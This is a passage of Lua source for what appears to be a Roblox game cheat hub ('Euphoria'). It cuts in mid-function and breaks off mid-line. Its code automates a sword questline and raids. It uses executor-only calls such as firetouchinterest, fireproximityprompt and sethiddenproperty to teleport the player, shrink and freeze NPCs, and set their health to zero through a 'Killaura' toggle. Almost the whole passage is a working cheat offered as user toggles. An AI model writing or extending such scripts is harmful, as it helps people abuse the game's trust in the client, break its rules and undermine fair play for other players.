                if game.Workspace.Enemies:FindFirstChild("Cake Prince") then v = game.Workspace.Enemies:FindFirstChild("Cake Prince") end 
                if game.Workspace.Enemies:FindFirstChild("Dough King") then v = game.Workspace.Enemies:FindFirstChild("Dough King") end
                if ReplicatedStorage:FindFirstChild("Dough King") then v = ReplicatedStorage:FindFirstChild("Dough King") end
                if ReplicatedStorage:FindFirstChild("Cake Prince") then v = ReplicatedStorage:FindFirstChild("Cake Prince") end
                if getDistance(v.HumanoidRootPart.CFrame) > 3000 then
                    if not delta then
                        StopTween()
                        firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.CakeLoaf.BigMirror.Main, 0) 
                        firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.CakeLoaf.BigMirror.Main, 1) 
                        wait(1.5)
                    else
                        if getDistance(workspace.Map.CakeLoaf.BigMirror:GetPivot()) > 50 then
                            toPoint(workspace.Map.CakeLoaf.BigMirror:GetPivot())
                            wait(1.5)
                        else
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                        end
                    end
                end
            end
            
            

            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.KillDough and third_sea then
                            if game.Workspace.Enemies:FindFirstChild("Dough King") or game.Workspace.Enemies:FindFirstChild("Cake Prince") then
                                if game.Workspace.Enemies:FindFirstChild("Dough King") then v = game.Workspace.Enemies:FindFirstChild("Dough King") end 
                                if game.Workspace.Enemies:FindFirstChild("Cake Prince") then v = game.Workspace.Enemies:FindFirstChild("Cake Prince") end 
                                if v:FindFirstChild("HumanoidRootPart") then
                                    if v.Humanoid.Health <= 0 then 
                                        StopTween()
                                    else
                                        if StoppedTween then 
                                            StopTween()
                                            wait(.1)
                                            StoppedTween = false
                                        end
                                        repeat task.wait()
                                            EquipWeapon(_G.SelectWeapon)
                                            tpToDoughIfNeed()
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            v.Humanoid:ChangeState(14)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            NameMon = v.Name
                                            PosMon = v.HumanoidRootPart.CFrame
                                        until not _G.KillDough or not v.Parent or v.Humanoid.Health <= 0 or not LP.Character:FindFirstChild("Humanoid") or LP.Character:FindFirstChild("Humanoid").Health <= 0
                                    end
                                else
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                end
                            elseif ReplicatedStorage:FindFirstChild("Dough King") or ReplicatedStorage:FindFirstChild("Cake Prince") then
                                tpToDoughIfNeed()
                            end
                        end
                    end)
                end
            end)
            
            function EquipSword(SwordName)
                if not LP.Character:FindFirstChild(SwordName) then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadItem",SwordName)
                end
            end
            function getGoodProgress()
                return ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil").Good
            end
            function getEvilProgress()
                return ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil").Evil
            end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["AutoCDK"] then
                            AutoCDK = true
                        else
                            AutoCDK = false
                        end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        if AutoCDK then
                            if not game.Players.LocalPlayer.Neutral then
                                if _G.FarmingMastery == true then
                                    _G.FarmingMastery = false
                                    FarmBonesCDK = false
                                end
                                if not isWeaponInInventory("Cursed Dual Katana") then
                                    if GetMaterial("Alucard Fragment") < 6 and isWeaponInInventory("Yama") and isWeaponInInventory("Tushita") then
                                        if getWeaponMastery("Yama") < 350 then
                                            FarmBonesCDK = true
                                            EquipSword("Yama")
                                            _G.SelectWeapon = "Sword"
                                            _G.FarmingMastery = true
                                        elseif getWeaponMastery("Tushita") < 350 then
                                            FarmBonesCDK = true
                                            EquipSword("Tushita")
                                            _G.SelectWeapon = "Sword"
                                            _G.FarmingMastery = true
                                        else
                                            if getEvilProgress() ~= -2 and getEvilProgress() ~= 4 then
                                                if getEvilProgress() == 0 or getEvilProgress() == -3 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                                    QuestYama1 = true
                                                    QuestYama2 = false
                                                    QuestYama3 = false
                                                    QuestTushita1 = false
                                                    QuestTushita2 = false
                                                    QuestTushita3 = false
                                                elseif getEvilProgress() == 1 or getEvilProgress() == -4 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                                    QuestYama1 = false
                                                    QuestYama2 = true
                                                    QuestYama3 = false
                                                    QuestTushita1 = false
                                                    QuestTushita2 = false
                                                    QuestTushita3 = false
                                                elseif getEvilProgress() == 2 or getEvilProgress() == -5 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                                    QuestYama1 = false
                                                    QuestYama2 = false
                                                    QuestYama3 = true
                                                    QuestTushita1 = false
                                                    QuestTushita2 = false
                                                    QuestTushita3 = false
                                                end
                                            elseif getGoodProgress() ~= -2 and getGoodProgress() ~= 3 then
                                                if getGoodProgress() == 0 or getGoodProgress() == -3 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                                    QuestYama1 = false
                                                    QuestYama2 = false
                                                    QuestYama3 = false
                                                    QuestTushita1 = true
                                                    QuestTushita2 = false
                                                    QuestTushita3 = false
                                                elseif getGoodProgress() == 1 or getGoodProgress() == -4 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                                    QuestYama1 = false
                                                    QuestYama2 = false
                                                    QuestYama3 = false
                                                    QuestTushita1 = false
                                                    QuestTushita2 = true
                                                    QuestTushita3 = false
                                                elseif getGoodProgress() == 2 or getGoodProgress() == -5 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                                    QuestYama1 = false
                                                    QuestYama2 = false
                                                    QuestYama3 = false
                                                    QuestTushita1 = false
                                                    QuestTushita2 = false
                                                    QuestTushita3 = true
                                                end
                                            else
                                                QuestYama1 = false
                                                QuestYama2 = false
                                                QuestYama3 = false
                                                QuestTushita1 = false
                                                QuestTushita2 = false
                                                QuestTushita3 = false
                                            end
                                        end
                                    else
                                        if GetMaterial("Alucard Fragment") == 6 then
                                            QuestYama1 = false
                                            QuestYama2 = false
                                            QuestYama3 = false
                                            QuestTushita1 = false
                                            QuestTushita2 = false
                                            QuestTushita3 = false
                                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton Boss") then
                                                UnEquip()
                                                v = game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton Boss")
                                                toPoint(v.HumanoidRootPart.CFrame)
                                                if LP.Character.Humanoid.Health < LP.Character.Humanoid.MaxHealth - (LP.Character.Humanoid.MaxHealth / 100 * 20) then
                                                    LP.Character.Humanoid.Health = 0
                                                end
                                            else
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                                if not workspace.Map.Turtle.Cursed.Pedestal3.ProximityPrompt.Enabled and not workspace.Map.Turtle.Cursed.Pedestal1.ProximityPrompt.Enabled and not workspace.Map.Turtle.Cursed.Pedestal2.ProximityPrompt.Enabled then
                                                    useNearestEntrance(CFrame.new(-12328.874, 610.103271, -6548.29932, -0.987361133, 4.54700206e-08, -0.15848659, 4.09048759e-08, 1, 3.20666658e-08, 0.15848659, 2.51785046e-08, -0.987361133))
                                                    followTarget(CFrame.new(-12328.874, 610.103271, -6548.29932, -0.987361133, 4.54700206e-08, -0.15848659, 4.09048759e-08, 1, 3.20666658e-08, 0.15848659, 2.51785046e-08, -0.987361133))
                                                    wait(1)
                                                    followTarget(CFrame.new(-12353.4648, 603.354797, -6550.20996, 0.0669946522, -4.77900137e-08, 0.997753322, -1.9794669e-08, 1, 4.92267489e-08, -0.997753322, -2.3048127e-08, 0.0669946522))
                                                end
                                                if workspace.Map.Turtle.Cursed.Pedestal1.ProximityPrompt.Enabled then 
                                                    repeat wait()
                                                        if useNearestEntrance(workspace.Map.Turtle.Cursed.Pedestal1.CFrame) then
                                                            StopTween()
                                                        end
                                                        toPoint(workspace.Map.Turtle.Cursed.Pedestal1.CFrame)
                                                    until getDistance(workspace.Map.Turtle.Cursed.Pedestal1.CFrame) < 30 or LP.Character.Humanoid.Health <= 0
                                                    fireproximityprompt(workspace.Map.Turtle.Cursed.Pedestal1.ProximityPrompt)
                                                end
                                                if workspace.Map.Turtle.Cursed.Pedestal3.ProximityPrompt.Enabled then 
                                                    repeat wait()
                                                        if useNearestEntrance(workspace.Map.Turtle.Cursed.Pedestal3.CFrame) then
                                                            StopTween()
                                                        end
                                                        toPoint(workspace.Map.Turtle.Cursed.Pedestal3.CFrame)
                                                    until getDistance(workspace.Map.Turtle.Cursed.Pedestal3.CFrame) < 30 or LP.Character.Humanoid.Health <= 0
                                                    fireproximityprompt(workspace.Map.Turtle.Cursed.Pedestal3.ProximityPrompt)
                                                    wait(1)
                                                    local VirtualUser=game:service'VirtualUser'
                                                    VirtualUser:CaptureController()
                                                    VirtualUser:ClickButton1(Vector2.new(300,300))
                                                end   
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","SpawnBoss")
                                            end
                                        end
                                    end
                                end
                            else
                                repeat wait() until not game.Players.LocalPlayer.Neutral and LP.Character:FindFirstChild("Humanoid") and LP.Character:FindFirstChild("HumanoidRootPart")
                            end
                        else
                            QuestYama1 = false
                            QuestYama2 = false
                            QuestYama3 = false
                            QuestTushita1 = false
                            QuestTushita2 = false
                            QuestTushita3 = false
                            FarmBonesCDK = false
                        end
                    end)
                    if err then print(err) end
                end
            end)
            
            spawn(function()
                while wait() do
                    if QuestYama1 then
                        st, er = pcall(function()
                            if (game:GetService("Workspace").Enemies:FindFirstChild("Mythological Pirate") or ReplicatedStorage:FindFirstChild("Mythological Pirate")) and LP.Character.Humanoid.Health > 0 then
                                v = game:GetService("Workspace").Enemies:FindFirstChild("Mythological Pirate") or ReplicatedStorage:FindFirstChild("Mythological Pirate")
                                toPoint(v.HumanoidRootPart.CFrame)
                                EquipSword("Yama")
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                            else
                                toPoint(CFrame.new(-13451.46484375, 543.712890625, -6961.0029296875))
                            end
                        end)
                        if er then print(er) end
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        if QuestYama2 then
                            target = nil
                            for i,v in pairs(LP.QuestHaze:GetChildren()) do
                                if v.Value > 0 then
                                    target = v
                                    break
                                end
                            end
                            if target then
                                if not game:GetService("Workspace").Enemies:FindFirstChild(target.Name) then
                                    if ReplicatedStorage:FindFirstChild(target.Name) then
                                        if useNearestEntrance(ReplicatedStorage:FindFirstChild(target.Name).HumanoidRootPart.CFrame) then
                                            StopTween()
                                        end
                                        toPoint(ReplicatedStorage:FindFirstChild(target.Name).HumanoidRootPart.CFrame)
                                    else
                                        for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                            if string.find(v.Name, target.Name) then
                                                if useNearestEntrance(v.CFrame * OffsetCFrame()) then
                                                    StopTween()
                                                end
                                                toPoint(v.CFrame * OffsetCFrame())
                                                break
                                            end
                                        end             
                                    end
                                else
                                    v = game:GetService("Workspace").Enemies:FindFirstChild(target.Name)
                                    repeat wait()
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = true
                                        PosMon = v.HumanoidRootPart.CFrame
                                        EquipSword("Yama")
                                        EquipWeapon("Sword")
                                        v.HumanoidRootPart.Transparency = 1
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until v.Humanoid.Health <= 0 or not v:FindFirstChild("HazeESP")
                                end
                            end
                        end
                    end)
                    if err then print(err) end
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if QuestYama3 and game:GetService("Workspace").Map:FindFirstChild("HellDimension") then
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Hell's Messenger") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if getDistance(v.HumanoidRootPart.CFrame) < 1000 then
                                        if v.Name == "Cursed Skeleton" or v.Name == "Hell's Messenger" then
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Humanoid.Health = 0
                                            v.Head.CanCollide = false
                                            PosMon = game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame * CFrame.new(0,5,20)
                                            BringMobFarm = true
                                            v.HumanoidRootPart.Transparency = 1
                                        end
                                    end
                                end
                            end
                        end 
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    if QuestYama3 then
                        local s1, e1 = pcall(function()
                            if LP.Backpack:FindFirstChild("Hallow Essence") or LP.Character:FindFirstChild("Hallow Essence") then         
                                FarmBonesCDK = false  
                                -- if delta then
                                --     toTarget(workspace.Map["Haunted Castle"].Summoner.Detection.CFrame)
                                -- else
                                    if getDistance(CFrame.new(-9500.35352, 142.104813, 5868.80713, -0.999827981, 1.17699637e-08, -0.0185488295, 1.23603714e-08, 1, -3.17152917e-08, 0.0185488295, -3.19391056e-08, -0.999827981)) > 200 then
                                        toPoint(CFrame.new(-9500.35352, 142.104813, 5868.80713, -0.999827981, 1.17699637e-08, -0.0185488295, 1.23603714e-08, 1, -3.17152917e-08, 0.0185488295, -3.19391056e-08, -0.999827981))
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 0)
                                        wait()
                                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 1)
                                    end
                                -- end
                            else
                                if (not game:GetService("Workspace").Map:FindFirstChild("HellDimension") or not game:GetService("Workspace").Map["HellDimension"]:FindFirstChild("Torch1")) or getDistance(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame) > 4000 then
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") or game.ReplicatedStorage:FindFirstChild("Soul Reaper") then
                                        if not game:GetService("Workspace").Map:FindFirstChild("HellDimension") or getDistance(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame) > 4000 then
                                            if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") then
                                                sRip = game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper")
                                            elseif game.ReplicatedStorage:FindFirstChild("Soul Reaper") then
                                                sRip = game.ReplicatedStorage:FindFirstChild("Soul Reaper")
                                            end
                                            FarmBonesCDK = false
                                            toPoint(sRip.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)) 
                                            UnEquip()
                                        end
                                    else
                                        if GetMaterial("Bones") > 500 then
                                            FarmBonesCDK = false
                                            WaitingEssence = true
                                            toPoint(CFrame.new(-9500.35352, 142.104813, 5868.80713, -0.999827981, 1.17699637e-08, -0.0185488295, 1.23603714e-08, 1, -3.17152917e-08, 0.0185488295, -3.19391056e-08, -0.999827981))
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones","Buy",1,1)
                                        else
                                            FarmBonesCDK = true
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones","Buy",1,1)
                                        end
                                    end
                                else
                                    FarmBonesCDK = false
                                    repeat wait()
                                        if getDistance(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame) < 4000 then
                                            if game:GetService("Workspace").Map["HellDimension"].Torch1.ProximityPrompt.Enabled then
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame)
                                                wait(1.5)
                                                fireproximityprompt(game:GetService("Workspace").Map["HellDimension"].Torch1.ProximityPrompt)
                                            elseif game:GetService("Workspace").Map["HellDimension"].Torch2.ProximityPrompt.Enabled then
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Torch2.CFrame)
                                                wait(1.5)
                                                fireproximityprompt(game:GetService("Workspace").Map["HellDimension"].Torch2.ProximityPrompt)
                                            elseif game:GetService("Workspace").Map["HellDimension"].Torch3.ProximityPrompt.Enabled then
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Torch3.CFrame)
                                                wait(1.5)
                                                fireproximityprompt(game:GetService("Workspace").Map["HellDimension"].Torch3.ProximityPrompt)  
                                            else
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Exit.CFrame * CFrame.new(20,0,0))
                                                wait(1.5)
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Exit.CFrame)
                                                wait(1.5)
                                            end
                                        end
                                    until not AutoCDK or not QuestYama3
                                end
                            end
                        end)
                        if e1 then print(e1) end
                    end
                end
            end)

            spawn(function() 
                while wait() do
                    if QuestTushita1 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","BoatQuest",workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    if QuestTushita1 then
                        repeat wait()
                            useNearestEntrance(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125))
                            toPoint(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125))
                        until getDistance(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125)) < 20 or not AutoCDK or not QuestTushita1
                        wait(1)
                        repeat wait()
                            useNearestEntrance(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625))
                            toPoint(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625))
                        until getDistance(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625)) < 20 or not AutoCDK or not QuestTushita1
                        wait(1)
                        repeat wait()
                            useNearestEntrance(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875))
                            toPoint(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875))
                        until getDistance(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875)) < 20 or not AutoCDK or not QuestTushita1
                        wait(1)
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    if QuestTushita2 then
                        pcall(function()
                            RaidPos = CFrame.new(-5569.12939, 320.95163, -3037.64575, 0.887919843, -3.36478614e-08, 0.45999819, 5.15359346e-08, 1, -2.63303601e-08, -0.45999819, 4.70856847e-08, 0.887919843)
                            if getDistance(RaidPos) > 400 then
                                repeat wait()
                                    useNearestEntrance(RaidPos)
                                    toPoint(RaidPos)
                                until getDistance(RaidPos) < 20
                            end
                            BringMobFarm = false
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if getDistance(v.HumanoidRootPart.CFrame) < 1000 then
                                    repeat wait()
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        PosMon = v.HumanoidRootPart.CFrame
                                        EquipSword("Tushita")
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until v.Humanoid.Health <= 0 or not v.Parent or not AutoCDK or not QuestTushita2 or LP.Character.Humanoid.Health <= 0
                                end
                            end
                        end)
                    end
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if QuestTushita3 and game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") then
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Heaven's Guardian") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if getDistance(v.HumanoidRootPart.CFrame) < 1000 then
                                        if v.Name == "Cursed Skeleton" or v.Name == "Heaven's Guardian" then
                                            BringMobFarm = true
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Humanoid.Health = 0
                                            v.Head.CanCollide = false
                                            PosMon = game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.CFrame * CFrame.new(-20,0,20)
                                            v.HumanoidRootPart.Transparency = 1
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if QuestTushita3 then
                        pcall(function()
                            if not game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") then
                                if (game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") and game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen").Humanoid.Health > 0) or (game.ReplicatedStorage:FindFirstChild("Cake Queen") and game.ReplicatedStorage:FindFirstChild("Cake Queen").Humanoid.Health > 0) then
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") then
                                        v = game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen")
                                        repeat wait()
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipSword("Tushita")
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not AutoCDK or not QuestTushita3 or game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") or v.Humanoid.Health <= 0 or not v.Parent or not LP.Character.Humanoid.Health <= 0
                                        StopTween()
                                        wait(2)
                                    else
                                        v = game.ReplicatedStorage:FindFirstChild("Cake Queen")
                                        toPoint(v * OffsetCFrame())
                                    end
                                else
                                    pos = CFrame.new(-715.122131, 399.923676, -11021.1973, 0.975071549, -7.006755e-08, -0.221890613, 7.95295918e-08, 1, 3.37080195e-08, 0.221890613, -5.05146041e-08, 0.975071549)
                                    if getDistance(pos) < 5000 then
                                        HopServer()
                                    else
                                        repeat wait()
                                            toPoint(pos)
                                        until getDistance(pos) < 20 or LP.Character.Humanoid.Health <= 0
                                    end
                                end
                            else
                                repeat wait()
                                    if getDistance(game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.CFrame) < 4000 then
                                        if game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.ProximityPrompt.Enabled then
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.CFrame) 
                                            fireproximityprompt(game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.ProximityPrompt)
                                            wait(1.5)
                                        elseif game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.ProximityPrompt.Enabled then
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.CFrame) 
                                            fireproximityprompt(game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.ProximityPrompt)  
                                            wait(1.5)
                                        elseif game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.ProximityPrompt.Enabled then
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.CFrame) 
                                            fireproximityprompt(game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.ProximityPrompt) 
                                            wait(1.5)   
                                        else
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Exit.CFrame)
                                            wait()
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Exit.CFrame * CFrame.new(10,0,0))
                                        end
                                    end
                                until not AutoCDK or not QuestTushita3 or GetMaterial("Alucard Fragment") == 6
                            end
                        end)
                    end
                end
            end)


        end
        
        local RaidTab = Window:NewTab("Raid")
        local RaidSection = RaidTab:NewSection("Raid")
       
        -- killaura
        SelectedChip = "Flame"
        KillauraRadius = 700
        Killaura = RaidSection:NewToggle("Killaura [ONLY WHILE RAID]", function(state)
            getgenv().EuphoriaSettings["killaura"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["killaura"] then Killaura:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["killaura"] and not BlockRaids then
                        if LP.PlayerGui.Main.Timer.Visible == true then
                            for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and LP.Character:FindFirstChild("HumanoidRootPart") and (LP.Character.HumanoidRootPart.CFrame.Position - v.HumanoidRootPart.CFrame.Position).Magnitude < KillauraRadius then
                                    pcall(function()
                                        repeat task.wait()
                                            sethiddenproperty(LP, "SimulationRadius", math.huge)
                                            BringMobFarm = false
                                            PosMon = v.HumanoidRootPart.CFrame
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            v.HumanoidRootPart.Size = Vector3.new(100,100,100)
                                            v.HumanoidRootPart.Transparency = 0.95
                                        until not getgenv().EuphoriaSettings["killaura"] or not v.Parent or v.Humanoid.Health <= 0 or not LP.Character:FindFirstChild("HumanoidRootPart") or (LP.Character.HumanoidRootPart.CFrame.Position - v.HumanoidRootPart.CFrame.Position).Magnitude > KillauraRadius
                                    end)
                                end
                            end
                        end
                    end
                end)
            end
        end)
        autonextisland = RaidSection:NewToggle("Auto Next Island [ONLY WHILE RAID]", function(state)
            getgenv().EuphoriaSettings["autonextisland"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["autonextisland"] and not BlockRaids then autonextisland:UpdateToggle(nil, true) end
        function isIslandNearest()
            islands = {"Island 5", "Island 4", "Island 3", "Island 2", "Island 1"}
            for i,islandName in pairs(islands) do
                for i,v in pairs(game.Workspace._WorldOrigin.Locations:GetChildren()) do
                    if v.Name == islandName then
                        if (LP.Character.HumanoidRootPart.Position - v.Position).Magnitude <= 5000 then
                            return true
                        end
                    end
                end
            end
            return false
        end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["autonextisland"] then
                        islands = {"Island 5", "Island 4", "Island 3", "Island 2", "Island 1"}
                        if LP.PlayerGui.Main.Timer.Visible == true then
                            NoClip = true
                            found = false
                            for i,islandName in pairs(islands) do
                                for i,v in pairs(game.Workspace._WorldOrigin.Locations:GetChildren()) do
                                    if v.Name == islandName then
                                        if (LP.Character.HumanoidRootPart.Position - v.Position).Magnitude <= 5000 then
                                            toPoint(CFrame.new(v.CFrame.X, 45, v.CFrame.Z))
                                            found = true
                                            break
                                        end
                                    end
                                end
                                if found then break end
                            end
                        else
                            NoClip = false
                        end
                    else
                        NoClip = false
                    end
                end)
            end
        end)
        autostartraid = RaidSection:NewToggle("A
        
